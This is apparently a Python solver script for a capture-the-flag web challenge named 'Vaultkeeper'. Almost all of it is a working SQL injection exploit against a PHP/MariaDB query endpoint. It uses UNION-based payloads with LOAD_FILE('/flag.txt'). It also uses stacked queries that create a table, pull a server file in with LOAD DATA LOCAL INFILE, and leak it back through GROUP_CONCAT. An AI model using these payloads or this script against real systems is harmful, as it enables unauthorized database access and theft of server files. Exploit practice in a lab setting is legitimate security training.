#!/usr/bin/env python3
import os
import re
import sys
import json
import time
import random
import string
from typing import Any, Optional

import requests

FLAG_RE = re.compile(r"TFC\{[^}\r\n]{1,300}\}")


def target_from_args() -> str:
    if len(sys.argv) > 1:
        return sys.argv[1].rstrip("/")
    return os.environ.get("TARGET", "http://127.0.0.1:8080").rstrip("/")


def die(msg: str) -> None:
    print(f"[-] {msg}", file=sys.stderr)
    sys.exit(1)


def find_flag(obj: Any) -> Optional[str]:
    """Recursively scan JSON-ish data for the real flag string."""
    if isinstance(obj, str):
        m = FLAG_RE.search(obj)
        return m.group(0) if m else None
    if isinstance(obj, dict):
        for v in obj.values():
            hit = find_flag(v)
            if hit:
                return hit
    if isinstance(obj, list):
        for v in obj:
            hit = find_flag(v)
            if hit:
                return hit
    return None


class Vaultkeeper:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": "vaultkeeper-solver/1.0"})

    def run_filter(self, filt: str, timeout: int = 12) -> dict:
        url = f"{self.base}/api/query.php"
        r = self.s.get(url, params={"filter": filt}, timeout=timeout)
        try:
            return r.json()
        except Exception:
            return {"_http_status": r.status_code, "_text": r.text[:1000]}

    def stacked(self, sql_tail: str) -> dict:
        # /api/query.php builds:
        # SELECT id,name,bytes,kind FROM catalog WHERE <filter> ORDER BY id LIMIT 50
        # db_restore() enables MYSQL_ATTR_MULTI_STATEMENTS, so a semicolon in
        # <filter> reaches MariaDB as stacked statements.
        return self.run_filter(f"1=0; {sql_tail}; -- ")


def try_load_file(vk: Vaultkeeper) -> Optional[str]:
    print("[+] trying direct LOAD_FILE() via catalog filter injection")
    # Usually blocked by FILE privilege / secure_file_priv, but it is cheap to try.
    probes = [
        "1=0 UNION ALL SELECT 31337, COALESCE(LOAD_FILE('/flag.txt'), ''), 0, 'flag' -- ",
        "1=0 UNION ALL SELECT 31337, COALESCE(TO_BASE64(LOAD_FILE('/flag.txt')), ''), 0, 'flag_b64' -- ",
    ]
    for filt in probes:
        j = vk.run_filter(filt)
        hit = find_flag(j)
        if hit:
            return hit
    return None


def try_local_infile(vk: Vaultkeeper) -> Optional[str]:
    print("[+] trying LOAD DATA LOCAL INFILE('/flag.txt') through PDO/MySQL client")
    suffix = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    table = f"vk_leak_{suffix}"

    # Create a staging table, then make MariaDB request /flag.txt from the PHP PDO
    # client. Because the PHP-FPM process can read /flag.txt, the line lands in
    # our table inside the vk_restore schema.
    setup = (
        f"DROP TABLE IF EXISTS `{table}`; "
        f"CREATE TABLE `{table}` (v TEXT); "
        f"LOAD DATA LOCAL INFILE '/flag.txt' INTO TABLE `{table}` "
        "LINES TERMINATED BY '\\n'"
    )
    j = vk.stacked(setup)
    if j.get("ok") is False or "error" in j:
        print(f"[*] setup response: {json.dumps(j, ensure_ascii=False)[:300]}")

    # Exfiltrate the row back through the first SELECT using UNION.
    leak_filter = (
        f"1=0 UNION ALL SELECT 31337, GROUP_CONCAT(v SEPARATOR '\\n'), 0, 'flag' "
        f"FROM `{table}` -- "
    )
    j = vk.run_filter(leak_filter)
    hit = find_flag(j)

    # Best-effort cleanup; ignore errors because the flag may already be found.
    try:
        vk.stacked(f"DROP TABLE IF EXISTS `{table}`")
    except Exception:
        pass

    return hit


def main() -> None:
    target = target_from_args()
    print(f"[+] target: {target}")
    vk = Vaultkeeper(target)

    # Sanity check that the target is the Vaultkeeper app and query endpoint is alive.
    try:
        sanity = vk.run_filter("kind = 'backup'")
    except requests.RequestException as e:
        die(f"cannot reach target: {e}")
    if "results" not in sanity and "saved" not in sanity:
        print(f"[*] unexpected sanity response: {json.dumps(sanity, ensure_ascii=False)[:500]}")

    flag = try_load_file(vk)
    if not flag:
        flag = try_local_infile(vk)

    if not flag:
        die("flag not recovered. If the instance blocks LOCAL INFILE, paste the setup response above.")

    print(f"<FLAG>{flag}</FLAG>")


if __name__ == "__main__":
    main()

